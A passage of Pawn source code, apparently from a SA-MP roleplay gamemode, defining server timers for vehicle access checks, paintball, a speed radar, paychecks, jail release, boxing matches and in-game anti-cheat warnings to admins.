 	    SetPlayerInterior(playerid, PlayerInfo[playerid][pInt]);
 	    SendClientMessage(playerid, COLOR_YELLOW, "[debug] Your coordinates should now be fine.");

 	    new
 	        Float: fPos[3];

		GetPlayerPos(playerid, fPos[0], fPos[1], fPos[2]);
		printf("[debug - coordinate problem] Real coordinates: %f, %f, %f", fPos[0], fPos[1], fPos[2]);
 	} else SendClientMessage(playerid, COLOR_YELLOW, "[debug] Your coordinates have been set properly.");*/
	return 1;
}

// Timer Name: NOPCheck(playerid)
Delay:NOPCheck[5000, i](playerid)
{
	if(GetPlayerState(playerid) != 2) NOPTrigger[playerid] = 0;
	new newcar = GetPlayerVehicleID(playerid);
	if(PlayerInfo[playerid][pAdmin] > 4 || GetPlayerState(playerid) != 2) return 1;
	else if(IsACopCar(newcar) && PlayerInfo[playerid][pFaction] != 1 && PlayerInfo[playerid][pLeader] != 1) ExecuteNOPAction(playerid);
	else if(IsAFBICar(newcar) && PlayerInfo[playerid][pFaction] != 2 && PlayerInfo[playerid][pLeader] != 2) ExecuteNOPAction(playerid);
	else if(IsAnAmbulance(newcar) && PlayerInfo[playerid][pFaction] != 3 && PlayerInfo[playerid][pLeader] != 3) ExecuteNOPAction(playerid);
    //else if(IsAGovCar(newcar) && PlayerInfo[playerid][pFaction] != 5 && PlayerInfo[playerid][pLeader] != 5) ExecuteNOPAction(playerid);
    else if(IsANewsVeh(newcar) && PlayerInfo[playerid][pFaction] != 9 && PlayerInfo[playerid][pLeader] != 9) ExecuteNOPAction(playerid);
	else if(IsATruckerCar(newcar) && PlayerInfo[playerid][pJob] != 20 && PlayerInfo[playerid][pJob2] != 20) ExecuteNOPAction(playerid);
	else if(IsAPizzaCar(newcar) && PlayerInfo[playerid][pJob] != 21 && PlayerInfo[playerid][pJob2] != 21) ExecuteNOPAction(playerid);
	else if(IsAPlane(newcar) && (PlayerInfo[playerid][pFlyLic] != 1)) ExecuteNOPAction(playerid);
	return 1;
}

// Timer Name: ServerMicrobeat()
// TickRate: 400 Milliseconds
Timer:ServerMicrobeat[400]()
{
    new
        Float: fCurrentSpeed,
		iVehicle,
		arrDamage[4],
		szSpeed[42];

	foreach(Player, i)
	{
	    if(GetPlayerState(i) == PLAYER_STATE_DRIVER)
		{
			if(arr_Towing[i] != INVALID_VEHICLE_ID) {
				if(GetVehicleModel(arr_Towing[i]) && IsVehicleStreamedIn(arr_Towing[i], i)) AttachTrailerToVehicle(arr_Towing[i], GetPlayerVehicleID(i));
				else arr_Towing[i] = INVALID_VEHICLE_ID;
			}
            fCurrentSpeed = player_get_speed(i);
			if(PlayerInfo[i][pSpeedo] != 0 && FindTimePoints[i] == 0) {
				format(szSpeed, sizeof(szSpeed),"~n~~n~~n~~n~~n~~n~~n~~n~~n~~w~%.0f MPH", fCurrentSpeed);
				GameTextForPlayer(i, szSpeed, 1500, 3);
			}
			iVehicle = GetPlayerVehicleID(i);
  			for(new x = 0; x < sizeof(SpikeStrips); ++x) if(SpikeStrips[x][sX] != 0 && GetVehicleDistanceFromPoint(iVehicle, SpikeStrips[x][sX], SpikeStrips[x][sY], SpikeStrips[x][sZ]) <= 3.5) {
				GetVehicleDamageStatus(iVehicle, arrDamage[0], arrDamage[1], arrDamage[2], arrDamage[3]);
				arrDamage[3] = encode_tires(1, 1, 1, 1);
				UpdateVehicleDamageStatus(iVehicle, arrDamage[0], arrDamage[1], arrDamage[2], arrDamage[3]);
	   		}
		}
	}
}

Timer:Paintball[1000]()
{
    for(new f = 0; f < 7; f++) {
        if(gaPaintballGameTimeRemaining[f] > 0) {
            gaPaintballGameTimeRemaining[f]--;

			new
				//szScoreText[512],
				szWinner[128],
				szMessage[128];

            if(gaPaintballGameTimeRemaining[f] == 1) {
                new
					iHighestScore,
					iScore,
                    iHighestScorer = INVALID_PLAYER_ID;

				foreach(Player, x) {
				    iScore = GetPVarInt(x, "PBMS");

				    if(iScore > iHighestScore && GetPVarInt(x, "PBM") == f) {
				        iHighestScore = iScore;
				        iHighestScorer = x;
				    }
				}

				if(iHighestScorer != INVALID_PLAYER_ID) { // just in case no valid player won
				    	format(szWinner, sizeof(szWinner), "The winner of the round is %s with a score of %d! (%d kills, %d deaths)", GetPlayerNameEx(iHighestScorer), iHighestScore, GetPVarInt(iHighestScorer, "PBMK"), GetPVarInt(iHighestScorer, "PBMD"));
				} else {
				    format(szWinner, sizeof(szWinner), "No winner this time around!");
				}

				/*new
				    scIt;

				foreach(Player, x) {
				    PlayerRatio[scIt][iKills] = GetPVarInt(x, "PBMK");
				    PlayerRatio[scIt][iPlayerID] = x;
				    scIt++;
				}

				HighScores(PlayerRatio, 0, MAX_PLAYERS);

				new
				    iterator,
				    iterator2;

				format(szScoreText, sizeof(szScoreText), "The scoreboard is as follows:\n\n");
				foreach(Player, x) {
				    SendClientMessageToAll(COLOR_YELLOW, szScoreText);
				    print(szScoreText);
				    iterator2++;
					if(GetPVarInt(x, "PBM") == f) {
					    iterator++;
						format(szScoreText, sizeof(szScoreText), "%s%d. %s - %d kills, %d deaths\n", szScoreText, iterator, GetPlayerNameEx(PlayerRatio[iterator][iPlayerID]), PlayerRatio[iterator][iKills], GetPVarInt(PlayerRatio[iterator][iPlayerID], "PBMD"));
					}
				}*/
            }

			foreach(Player, playerid) {
			    if(GetPVarInt(playerid, "PBM") == f) {
		            switch(gaPaintballGameTimeRemaining[f]) {
		                case 6: {
							GameTextForPlayer(playerid, "~r~ Game ends in...~n~ ~g~ 5", 1000, 3);
							TogglePlayerControllable(playerid, false);
						}
						case 5: GameTextForPlayer(playerid, "~r~ Game ends in...~n~ ~g~ 4", 1000, 3);
		                case 4: GameTextForPlayer(playerid, "~r~ Game ends in...~n~ ~g~ 3", 1000, 3);
		                case 3: GameTextForPlayer(playerid, "~r~ Game ends in...~n~ ~g~ 2", 1000, 3);
		                case 2: GameTextForPlayer(playerid, "~r~ Game ends in...~n~ ~y~ 1", 1000, 3);
		                case 1: {
		                    GameTextForPlayer(playerid, "~r~ Game ~r~over!", 2000, 3);
		                    SendClientMessage(playerid, COLOR_RED, "Game over!");

		                    SetPlayerPos(playerid, 1782.8229, -1565.8177, 13.3472);
		                    SetPlayerInterior(playerid, 0);
		                    SetPlayerVirtualWorld(playerid, 0);

							LoadObjectsForPlayer(playerid);

						    //ShowPlayerDialogEx(playerid, 0, DIALOG_STYLE_MSGBOX, "Scoreboard (in order of kills)", szScoreText, "OK", "");

						    SendClientMessage(playerid, COLOR_ORANGE, szWinner);

						    format(szMessage, sizeof(szMessage), "You gained %d kills and you died %d times (Score: %d).", GetPVarInt(playerid, "PBMK"), GetPVarInt(playerid, "PBMD"), GetPVarInt(playerid, "PBMS"));
						    SendClientMessage(playerid, COLOR_WHITE, szMessage);

							DeletePVar(playerid, "PBM");
							DeletePVar(playerid, "PBMK");
							DeletePVar(playerid, "PBMD");
							DeletePVar(playerid, "PBMS");
							if(PaintballTeam[playerid] != 0) {
							    SetPlayerToTeamColor(playerid);
							    PaintballTeam[playerid] = 0;
							}

							SetPlayerHealth(playerid, GetPVarFloat(playerid, "pbhealth"));
							SetPlayerArmourEx(playerid, GetPVarFloat(playerid, "pbarmour"));
							SetPlayerTeam(playerid, -1);
							ResetPlayerWeapons(playerid);
							PlayerInfo[playerid][pAGuns][0] = 0;
							PlayerInfo[playerid][pAGuns][1] = 0;
							PlayerInfo[playerid][pAGuns][2] = 0;
							PlayerInfo[playerid][pAGuns][3] = 0;
							PlayerInfo[playerid][pAGuns][4] = 0;
							PlayerInfo[playerid][pAGuns][5] = 0;
							PlayerInfo[playerid][pAGuns][6] = 0;
							PlayerInfo[playerid][pAGuns][7] = 0;
							PlayerInfo[playerid][pAGuns][8] = 0;
							PlayerInfo[playerid][pAGuns][9] = 0;
							PlayerInfo[playerid][pAGuns][10] = 0;
							PlayerInfo[playerid][pAGuns][11] = 0;
							SetPlayerWeapons(playerid);

							DeletePVar(playerid, "pbhealth");
							DeletePVar(playerid, "pbarmour");
		                }
		            }
	            }
            }
        }
	}
}

Timer:SpeedRadarTimer[3000]()
{
	foreach(Player, i) {
		if(playerTabbed[i] != 1 && IsACop(i) && RadarActive[i] == 1) {
			new Float:x, Float:y, Float:z, targetvehicle, string[68];
			foreach(Player, j) {
				if(IsPlayerInAnyVehicle(j) && j != i && GetPlayerVehicleSeat(j) == 0) {
					targetvehicle = GetPlayerVehicleID(j);
					if(IsVehicleStreamedIn(targetvehicle, i)) {
						GetPlayerPos(j, x, y, z);
						if(IsPlayerAimingAt(i, x, y, z, 10)) {
							RadarWarning[i] = 0;
							format(string, sizeof(string), "%s (ID: %i) ~n~Speed: %.0f MPH", GetVehicleName(targetvehicle), j, fVehSpeed[j]);
							TextDrawSetString(RadarContext[i], string);
						}
					}
				}
			}
			if(RadarWarning[i] >= 2) { // 6 seconds
				TextDrawSetString(RadarContext[i], "Seeking speed...");
			} else RadarWarning[i] ++;
		}
	}
}

// Timer Name: ServerHeartbeat()
// TickRate: 1 secs.
Timer:ServerHeartbeat[1000]()
{
	foreach(Player, i)
	{
		if(playerTabbed[i] != 1) switch(PlayerInfo[i][pLevel])
		{
			case 0 .. 2: PlayerInfo[i][pPayCheck] += 1;
			case 3 .. 4: PlayerInfo[i][pPayCheck] += 2;
			case 5 .. 6: PlayerInfo[i][pPayCheck] += 3;
			case 7 .. 8: PlayerInfo[i][pPayCheck] += 4;
			case 9 .. 10: PlayerInfo[i][pPayCheck] += 5;
			case 11 .. 12: PlayerInfo[i][pPayCheck] += 6;
			case 13 .. 14: PlayerInfo[i][pPayCheck] += 7;
			case 15 .. 16: PlayerInfo[i][pPayCheck] += 8;
			case 17 .. 18: PlayerInfo[i][pPayCheck] += 9;
			case 19 .. 20: PlayerInfo[i][pPayCheck] += 10;
			default: PlayerInfo[i][pPayCheck] += 11;
		}

		if(GetPVarType(i, "DistortAim") != 0) {
		    if(GetPlayerSurfingVehicleID(i) == INVALID_VEHICLE_ID) {
				DeletePVar(i, "DistortAim");
				SetPlayerDrunkLevel(i, 0);
			}
		}

		if(GetPlayerSurfingVehicleID(i) != INVALID_VEHICLE_ID && AdminDuty[i] == 0) {
		    if(GetVehicleSpeedByVehicleID(GetPlayerSurfingVehicleID(i)) > 7) {
			    if(GetPVarType(i, "DistortAim") == 0) {
					switch(GetVehicleModel(GetPlayerSurfingVehicleID(i))) {
					    case 422, 478, 543, 554, 600, 605, 607, 472, 473, 493, 595, 484, 430, 453, 452, 446, 454: {
							SetPVarInt(i, "DistortAim", 1);
							SetPlayerDrunkLevel(i, 35000);
						}
						default: {
						    GetPlayerPos(i, PlayerInfo[i][pPos_x], PlayerInfo[i][pPos_y], PlayerInfo[i][pPos_z]);
						    SetPlayerPos(i, PlayerInfo[i][pPos_x], PlayerInfo[i][pPos_y]+1.5, PlayerInfo[i][pPos_z]);
						    GameTextForPlayer(i, "~r~ You slipped off!", 1500, 3);
						}
					}
				}
			}
		}

		if(PlayerInfo[i][pJailed] > 0)
		{
			if(PlayerInfo[i][pJailTime] > 0)
			{
				if(playerTabbed[i] != 1)
				{
					PlayerInfo[i][pJailTime]--;
				}
			}
			if(PlayerInfo[i][pJailTime] <= 0)
			{
				PlayerInfo[i][pJailTime] = 0;
				if(PlayerInfo[i][pJailed] == 1)
				{
					SetPlayerInterior(i, 6);
					PlayerInfo[i][pInt] = 6;
					SetPlayerPos(i, 246.3764, 69.6958, 1003.6406);
					SetPlayerVirtualWorld(i, 20002);
					PlayerInfo[i][pVW] = 20002;
					SetPlayerFacingAngle(i, 180.0);
				}
				else if(PlayerInfo[i][pJailed] == 2)
				{
					SetPlayerInterior(i, 0);
					PlayerInfo[i][pInt] = 0;
					SetPlayerVirtualWorld(i, 0);
					PlayerInfo[i][pVW] = 0;
					SetPlayerPos(i,343.1081,-1521.4404,33.2985);
				}
				else if(PlayerInfo[i][pJailed] == 3)
				{
					SetPlayerInterior(i, 0);
					PlayerInfo[i][pInt] = 0;
					SetPlayerVirtualWorld(i, 0);
					PlayerInfo[i][pVW] = 0;
					SetPlayerPos(i,1529.6,-1691.2,13.3);

					strcpy(PlayerInfo[i][pPrisonedBy], "Nobody", 64);
					strcpy(PlayerInfo[i][pPrisonReason], "None", 64);
				}
				else if(PlayerInfo[i][pJailed] == 4)
				{
					SetPlayerInterior(i, 0);
					PlayerInfo[i][pInt] = 0;
					SetPlayerVirtualWorld(i, 0);
					PlayerInfo[i][pVW] = 0;
					SetPlayerPos(i,1529.6,-1691.2,13.3);
				}
				PlayerInfo[i][pJailed] = 0;
				PhoneOnline[i] = 0;
				SendClientMessage(i, COLOR_GRAD1,"   You have paid your debt to society.");
				GameTextForPlayer(i, "~g~Freedom~n~~w~Try to be a better citizen", 5000, 1);
				ClearCrime(i);
				SetPlayerToTeamColor(i);
			}
		}

		if(CommandSpamTimes[i] != 0)
		{
			CommandSpamTimes[i]--;
		}
		if(TextSpamTimes[i] != 0)
		{
			TextSpamTimes[i]--;
		}

		if(PlayerDragged[i] == 1) {
			if (PlayerDraggedBy[i] != INVALID_PLAYER_ID && IsCopDragging[PlayerDraggedBy[i]] == i) {
				if (!IsPlayerInAnyVehicle(i) && !IsPlayerInAnyVehicle(PlayerDraggedBy[i])) {
					new Float:gx,Float:gy,Float:gz;
					GetPlayerPos(PlayerDraggedBy[i], gx, gy, gz);
					Streamer_UpdateEx(i, gx, gy, gz);
					if (GetPlayerVirtualWorld(i) != GetPlayerVirtualWorld(PlayerDraggedBy[i])) {
						SetPlayerVirtualWorld(i,GetPlayerVirtualWorld(PlayerDraggedBy[i]));
						PlayerInfo[i][pVW] = GetPlayerVirtualWorld(PlayerDraggedBy[i]);
					}
					if (GetPlayerInterior(i) != GetPlayerInterior(PlayerDraggedBy[i])) {
						SetPlayerInterior(i,GetPlayerInterior(PlayerDraggedBy[i]));
						PlayerInfo[i][pInt] = GetPlayerInterior(PlayerDraggedBy[i]);
					}
					SetPlayerPos(i, gx, gy+1, gz);
					GameTextForPlayer(i, "BEING DRAGGED...", 5000, 3);
				} else PlayerDragged[i] = 0;
			} else PlayerDragged[i] = 0;
		}

		if(IsPlayerInAnyVehicle(i))
		{
			if(GetPlayerState(i) == PLAYER_STATE_DRIVER) SetPlayerArmedWeapon(i, 0);
			else if(PlayerInfo[i][pGuns][4] == 0) SetPlayerArmedWeapon(i, 0);
			else SetPlayerArmedWeapon(i, 29);
		}

		if(InsideMainMenu[i] == 1) {
		    new string[128];
		    format(string, sizeof(string), "Players online: %d", Iter_Count(Player));
		    TextDrawSetString(MainMenuTxtdraw[7], string);
		}

		if(GetPlayerSpecialAction(i) == SPECIAL_ACTION_USEJETPACK && JetPack[i] == 0 && AdminDuty[i] != 1) {
			new string[74 + MAX_PLAYER_NAME];
		    format(string, sizeof(string), "{AA3333}AdmWarning{FFFF00}: %s (ID %d) may possibly be jetpack hacking.", GetPlayerNameEx(i), i);
			ABroadCast(COLOR_YELLOW, string, 2);
			SetPVarInt(i, "jphW", GetPVarInt(i, "jphW")+1);

			if(GetPVarInt(i, "jphW") >= 3) {
				format(string, sizeof(string), "%s may possibly have jetpack hacked.", GetPlayerNameEx(i));
				AddAutomatedFlag(i, string);
				Log("logs/hack.log", string);
			}
		}

		if(GetPlayerState(i) == PLAYER_STATE_DRIVER && AdminDuty[i] != 1 && !IsAPlane(GetPlayerVehicleID(i))) {
  			new Float:fCurrentSpeed;
  			fCurrentSpeed = player_get_speed(i);
  			fVehSpeed[i] = fCurrentSpeed;
			if(fCurrentSpeed > 200) {
				new string[74 + MAX_PLAYER_NAME];
   				format(string, sizeof(string), "{AA3333}AdmWarning{FFFF00}: %s (ID %d) may possibly be speed hacking (%.0f MPH).", GetPlayerNameEx(i), i, fCurrentSpeed);
   				ABroadCast(COLOR_YELLOW, string, 2);
   				SetPVarInt(i, "shW", GetPVarInt(i, "shW")+1);

   				if(GetPVarInt(i, "shW") >= 3) {
	   				format(string, sizeof(string), "%s may possibly have speed hacked (speeds of up to %.0f MPH).", GetPlayerNameEx(i), fCurrentSpeed);
	   				AddAutomatedFlag(i, string);
   				}
			}
		}

		if(UsedFind[i] >= 1)
			--UsedFind[i];

		if(FindTime[i] >= 1) {
			if(FindTime[i] == FindTimePoints[i]) {
				FindTime[i] = 0;
				FindTimePoints[i] = 0;
				SetPlayerMarkerForPlayer(i, FindingPlayer[i], 0xFFFFFF00);
				SetPlayerToTeamColor(FindingPlayer[i]);
				FindingPlayer[i] = -1;
				PlayerPlaySound(i, 1056, 0.0, 0.0, 0.0);
				GameTextForPlayer(i, "~r~RedMarker gone", 2500, 1);
			} else {
			    new string[32];
				format(string, sizeof(string), "%d", FindTimePoints[i] - FindTime[i]);
				GameTextForPlayer(i, string, 1500, 6);
				FindTime[i] += 1;
			}
		}

		if(CalledCops[i] >= 1)
		{
			if(CopsCallTime[i] < 1) { CopsCallTime[i] = 0; HidePlayerBeaconForCops(i); CalledCops[i] = 0; }
			else
			{
				CopsCallTime[i]--;
			}
		}
		if(CalledMedics[i] >= 1)
		{
			if(MedicsCallTime[i] < 1) { MedicsCallTime[i] = 0; HidePlayerBeaconForMedics(i); CalledMedics[i] = 0; }
			else
			{
				MedicsCallTime[i]--;
			}
		}

		if(NewbieTimer[i] > 0)
		{
			NewbieTimer[i]--;
		}
		if(GlobalChatTimer[i] > 0)
		{
			GlobalChatTimer[i]--;
		}
		if(JustReported[i] > 0)
		{
			JustReported[i]--;
		}
		if(TaxiCallTime[i] > 0)
		{
			if(TaxiAccepted[i] < 999)
			{
				if(IsPlayerConnected(TaxiAccepted[i]))
				{
					new Float:X,Float:Y,Float:Z;
					GetPlayerPos(TaxiAccepted[i], X, Y, Z);
					SetPlayerCheckpoint(i, X, Y, Z, 5);
				}
			}
		}
		if(EMSCallTime[i] > 0)
		{
			if(EMSAccepted[i] < INVALID_PLAYER_ID)
			{
				if(IsPlayerConnected(EMSAccepted[i]))
				{
					new Float:X,Float:Y,Float:Z;
					GetPlayerPos(EMSAccepted[i], X, Y, Z);
					new zone[MAX_ZONE_NAME];
					Get3DZone(X, Y, Z, zone, sizeof(zone));
					new string[128];
					format(string, sizeof(string), "Your patient is located in %s.", zone);
					SetPlayerCheckpoint(i, X, Y, Z, 5);
				}
			}
		}

		if(BusCallTime[i] > 0)
		{
			if(BusAccepted[i] < 999)
			{
				if(IsPlayerConnected(BusAccepted[i]))
				{
					new Float:X,Float:Y,Float:Z;
					GetPlayerPos(BusAccepted[i], X, Y, Z);
					SetPlayerCheckpoint(i, X, Y, Z, 5);
				}
			}
		}
		if(MedicCallTime[i] > 0)
		{
			if(MedicCallTime[i] == 45) { MedicCallTime[i] = 0; DisablePlayerCheckpoint(i); PlayerPlaySound(i, 1056, 0.0, 0.0, 0.0); GameTextForPlayer(i, "~r~RedMarker gone", 2500, 1); }
			else
			{
			    new string[128];
				format(string, sizeof(string), "%d", 45 - MedicCallTime[i]);
				new Float:X,Float:Y,Float:Z;
				GetPlayerPos(MedicAccepted[i], X, Y, Z);
				SetPlayerCheckpoint(i, X, Y, Z, 5);
				GameTextForPlayer(i, string, 1500, 6);
				MedicCallTime[i] += 1;
			}
		}
		if(MechanicCallTime[i] > 0)
		{
			if(MechanicCallTime[i] == 30) { MechanicCallTime[i] = 0; DisablePlayerCheckpoint(i); PlayerPlaySound(i, 1056, 0.0, 0.0, 0.0); GameTextForPlayer(i, "~r~RedMarker gone", 2500, 1); }
			else
			{
			    new string[128];
				format(string, sizeof(string), "%d", 30 - MechanicCallTime[i]);
				GameTextForPlayer(i, string, 1500, 6);
				MechanicCallTime[i] += 1;
			}
		}

		if(PlayerInfo[i][pMechTime] > 0) PlayerInfo[i][pMechTime]--;
		if(PlayerInfo[i][pLawyerTime] > 0) PlayerInfo[i][pLawyerTime]--;
		if(PlayerInfo[i][pLawyerFreeTime] > 0) PlayerInfo[i][pLawyerFreeTime]--;
		if(PlayerInfo[i][pDrugsTime] > 0) PlayerInfo[i][pDrugsTime]--;


		if(PlayerInfo[i][pGCMuted] == 2 && PlayerInfo[i][pGCMutedTime] < 1)
		{
		    PlayerInfo[i][pGCMuted] = 0;
		}
		if(PlayerInfo[i][pGCMuted] > 1) PlayerInfo[i][pGCMutedTime]--;


		if(PlayerInfo[i][pRMuted] == 2 && PlayerInfo[i][pRMutedTime] < 1)
		{
		    PlayerInfo[i][pRMuted] = 0;
		}
		if(PlayerInfo[i][pRMuted] > 1) PlayerInfo[i][pRMutedTime]--;


		if(PlayerInfo[i][pCarTime] > 0)
		{
  			if(PlayerInfo[i][pCarTime] <= 0)
   			{
      			PlayerInfo[i][pCarTime] = 0;
		    }
		    else
		    {
      			PlayerInfo[i][pCarTime] -= 1;
		    }
		}

		if(PlayerInfo[i][pSexTime] > 0)
		{
			if(PlayerInfo[i][pSexTime] <= 0)
			{
				PlayerInfo[i][pSexTime] = 0;
			}
			else
			{
				PlayerInfo[i][pSexTime] -= 1;
			}
		}

		if(WantLawyer[i] >= 1)
		{
			CallLawyer[i] = 111;
			if(WantLawyer[i] == 1)
			{
				SendClientMessage(i, COLOR_LIGHTRED, "Do you want a Lawyer? (Type yes or no)");
			}
			WantLawyer[i] ++;
			if(WantLawyer[i] == 8)
			{
				SendClientMessage(i, COLOR_LIGHTRED, "Do you want a Lawyer? (Type yes or no)");
			}
			if(WantLawyer[i] == 15)
			{
				SendClientMessage(i, COLOR_LIGHTRED, "Do you want a Lawyer? (Type yes or no)");
			}
			if(WantLawyer[i] == 20)
			{
				SendClientMessage(i, COLOR_LIGHTRED, "There is no Lawyer available to you anymore.");
				WantLawyer[i] = 0;
				CallLawyer[i] = 0;
			}
		}

		if(PlayerStoned[i] >= 3)
		{
			PlayerStoned[i] += 1;
			SetPlayerDrunkLevel(i, 40000);
			if(PlayerStoned[i] == 50)
			{
				PlayerStoned[i] = 0;
				SetPlayerDrunkLevel(i, 0);
				SendClientMessage(i, COLOR_GRAD1, "You're no longer stoned!");
			}
		}

		if(BoxWaitTime[i] > 0)
		{
			if(BoxWaitTime[i] >= BoxDelay)
			{
				BoxDelay = 0;
				BoxWaitTime[i] = 0;
				PlayerPlaySound(i, 1057, 0.0, 0.0, 0.0);
				GameTextForPlayer(i, "~g~Match Started", 5000, 1);
				TogglePlayerControllable(i, 1);
				RoundStarted = 1;
			}
			else
			{
				new string[32];
				format(string, sizeof(string), "%d", BoxDelay - BoxWaitTime[i]);
				GameTextForPlayer(i, string, 1500, 6);
				BoxWaitTime[i] += 1;
			}
		}
		if(RoundStarted > 0)
		{
			if(PlayerBoxing[i] > 0)
			{
				new trigger = 0;
				new Lost = 0;
				new Float:angle;
				new Float:health;
				GetPlayerHealth(i, health);
				if(health < 12)
				{
					if(i == Boxer1) { Lost = 1; trigger = 1; }
					else if(i == Boxer2) { Lost = 2; trigger = 1; }
				}
				if(health < 28) { GetPlayerFacingAngle(i, angle); SetPlayerFacingAngle(i, angle + 85); }
				if(trigger)
				{
					new string[128];
					new winner[MAX_PLAYER_NAME];
					new loser[MAX_PLAYER_NAME];
					if(Lost == 1)
					{
						if(IsPlayerConnected(Boxer1) && IsPlayerConnected(Boxer2))
						{
							if(IsPlayerInRangeOfPoint(Boxer1,25.0,765.952270, 4.167977, 1000.719238) || IsPlayerInRangeOfPoint(Boxer2,25.0,765.952270, 4.167977, 1000.719238))
							{
								SetPlayerPos(Boxer1, 765.952270, 4.167977, 1000.719238); SetPlayerPos(Boxer2, 765.952270, 4.167977, 1000.719238);
								SetPlayerInterior(Boxer1, 5); SetPlayerInterior(Boxer2, 5);
								GetPlayerName(Boxer1, loser, sizeof(loser));
								GetPlayerName(Boxer2, winner, sizeof(winner));
								SetPlayerWeapons(Boxer1);
								SetPlayerWeapons(Boxer2);
								if(PlayerInfo[Boxer1][pJob] == 12 || PlayerInfo[Boxer1][pJob2] == 12) { PlayerInfo[Boxer1][pLoses] += 1; }
								if(PlayerInfo[Boxer2][pJob] == 12 || PlayerInfo[Boxer1][pJob2] == 12) { PlayerInfo[Boxer2][pWins] += 1; }
								format(string, sizeof(string), "* You have Lost the Fight against %s.", winner);
								SendClientMessage(Boxer1, COLOR_LIGHTBLUE, string);
								GameTextForPlayer(Boxer1, "~r~You lost", 3500, 1);
								format(string, sizeof(string), "* You have Won the Fight against %s.", loser);
								SendClientMessage(Boxer2, COLOR_LIGHTBLUE, string);
								GameTextForPlayer(Boxer2, "~r~You won", 3500, 1);
								if(GetPlayerHealth(Boxer1, health) < 20)
								{
									SendClientMessage(Boxer1, COLOR_LIGHTBLUE, "* You feel exhausted from the Fight, go eat somewhere.");
									SetPlayerHealth(Boxer1, 30.0);
								}
								else
								{
									SendClientMessage(Boxer1, COLOR_LIGHTBLUE, "* You feel perfect, even after the Fight.");
									SetPlayerHealth(Boxer1, 50.0);
								}
								if(GetPlayerHealth(Boxer2, health) < 20)
								{
									SendClientMessage(Boxer2, COLOR_LIGHTBLUE, "* You feel exhausted from the Fight, go eat somewhere.");
									SetPlayerHealth(Boxer2, 30.0);
								}
								else
								{
									SendClientMessage(Boxer2, COLOR_LIGHTBLUE, "* You feel perfect, even after the Fight.");
									SetPlayerHealth(Boxer2, 50.0);
								}
								GameTextForPlayer(Boxer1, "~g~Match Over", 5000, 1); GameTextForPlayer(Boxer2, "~g~Match Over", 5000, 1);

								if(PlayerInfo[Boxer2][pJob] == 12 || PlayerInfo[Boxer2][pJob2] == 12) {
								    #if defined DOUBLE_EXP_ENABLED
										new hour,minuite,second;
										gettime(hour,minuite,second);
										if(DoubleEXPcheck(hour))
										{
	 							 			PlayerInfo[Boxer2][pBoxSkill] += 2;
	    									SendClientMessage(Boxer2, COLOR_YELLOW, "* You have gained two skill points for this job due to double experience.");
										}
										else
										{
											SendClientMessage(Boxer2, COLOR_YELLOW, "* You have only gained one skill point for this job since it's not within the double experience hours.");
											PlayerInfo[Boxer2][pBoxSkill]++;
										}
									#else
									    PlayerInfo[Boxer2][pBoxSkill]++;
									#endif
								}

								PlayerBoxing[Boxer1] = 0;
								PlayerBoxing[Boxer2] = 0;
							}
						}
					}
					else if(Lost == 2)
					{
						if(IsPlayerConnected(Boxer1) && IsPlayerConnected(Boxer2))
						{
							if(IsPlayerInRangeOfPoint(Boxer1,25.0,765.952270, 4.167977, 1000.719238) || IsPlayerInRangeOfPoint(Boxer2,25.0, 765.952270, 4.167977, 1000.719238))
							{
								SetPlayerPos(Boxer1, 765.952270, 4.167977, 1000.719238); SetPlayerPos(Boxer2, 765.952270, 4.167977, 1000.719238);
								SetPlayerInterior(Boxer1, 5); SetPlayerInterior(Boxer2, 5);
								GetPlayerName(Boxer1, winner, sizeof(winner));
								GetPlayerName(Boxer2, loser, sizeof(loser));
								SetPlayerWeapons(Boxer1);
								SetPlayerWeapons(Boxer2);
								if(PlayerInfo[Boxer2][pJob] == 12 || PlayerInfo[Boxer2][pJob2] == 12) { PlayerInfo[Boxer2][pLoses] += 1; }
								if(PlayerInfo[Boxer1][pJob] == 12 || PlayerInfo[Boxer1][pJob2] == 12) { PlayerInfo[Boxer1][pWins] += 1; }
								format(string, sizeof(string), "* You have Lost the Fight against %s.", winner);
								SendClientMessage(Boxer2, COLOR_LIGHTBLUE, string);
								GameTextForPlayer(Boxer2, "~r~You lost", 3500, 1);
								format(string, sizeof(string), "* You have Won the Fight against %s.", loser);
								SendClientMessage(Boxer1, COLOR_LIGHTBLUE, string);
								GameTextForPlayer(Boxer1, "~g~You won", 3500, 1);
								if(GetPlayerHealth(Boxer1, health) < 20)
								{
									SendClientMessage(Boxer1, COLOR_LIGHTBLUE, "* You feel exhausted from the Fight, go eat somewhere.");
									SetPlayerHealth(Boxer1, 30.0);
								}
								else
								{
									SendClientMessage(Boxer1, COLOR_LIGHTBLUE, "* You feel perfect, even after the Fight.");
									SetPlayerHealth(Boxer1, 50.0);
								}
								if(GetPlayerHealth(Boxer2, health) < 20)
								{
									SendClientMessage(Boxer2, COLOR_LIGHTBLUE, "* You feel exhausted from the Fight, go eat somewhere.");
									SetPlayerHealth(Boxer2, 30.0);
								}
								else
								{
									SendClientMessage(Boxer2, COLOR_LIGHTBLUE, "* You feel perfect, even after the Fight.");
									SetPlayerHealth(Boxer2, 50.0);
								}
								GameTextForPlayer(Boxer1, "~g~Match Over", 5000, 1); GameTextForPlayer(Boxer2, "~g~Match Over", 5000, 1);

					   			#if defined DOUBLE_EXP_ENABLED
									new hour,minuite,second;
									gettime(hour,minuite,second);
									if(DoubleEXPcheck(hour)){
										PlayerInfo[Boxer1][pBoxSkill] += 2;
	    								SendClientMessage(Boxer2, COLOR_YELLOW, "* You have gained two skill points for this job due to double experience.");
									}
									else {
										SendClientMessage(Boxer2, COLOR_YELLOW, "* You have only gained one skill point for this job since it's not within the double experience hours.");
										PlayerInfo[Boxer1][pBoxSkill]++;
									}
								#else
								    PlayerInfo[Boxer1][pBoxSkill]++;
								#endif

								PlayerBoxing[Boxer1] = 0;
								PlayerBoxing[Boxer2] = 0;
							}
						}
					}
					InRing = 0;
					RoundStarted = 0;
					Boxer1 = INVALID_PLAYER_ID;
					Boxer2 = INVALID_PLAYER_ID;
					trigger = 0;
				}
			}
		}

		if(PlayerCuffed[i] == 1)
		{
			if(PlayerCuffedTime[i] <= 0)
			{
				//Frozen[i] = 0;
				SetPVarInt(i, "IsFrozen", 0);
				TogglePlayerControllable(i, 1);
				PlayerCuffed[i] = 0;
				SetPVarInt(i, "PlayerCuffed", 0);
				PlayerCuffedTime[i] = 0;
				ClearAnimations(i, 1);
				SetPlayerSkin(i, GetPlayerSkin(i));
				SetPlayerSpecialAction(i, SPECIAL_ACTION_NONE);
				new Float:X, Float:Y, Float:Z;
				GetPlayerPos(i, X, Y, Z);
				SetPlayerPos(i, X, Y, Z);
				if(PlayerDraggedBy[i] != INVALID_PLAYER_ID) {
